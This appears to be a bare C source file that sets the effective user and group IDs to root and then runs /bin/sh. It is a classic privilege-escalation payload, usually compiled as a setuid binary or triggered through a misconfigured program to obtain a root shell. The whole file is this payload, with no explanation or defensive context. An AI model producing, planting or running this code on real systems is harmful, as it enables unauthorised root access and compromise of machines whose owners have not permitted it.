#include<stdio.h>
#include<stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void main() {seteuid(0);setegid(0);execve("/bin/sh", NULL, NULL);}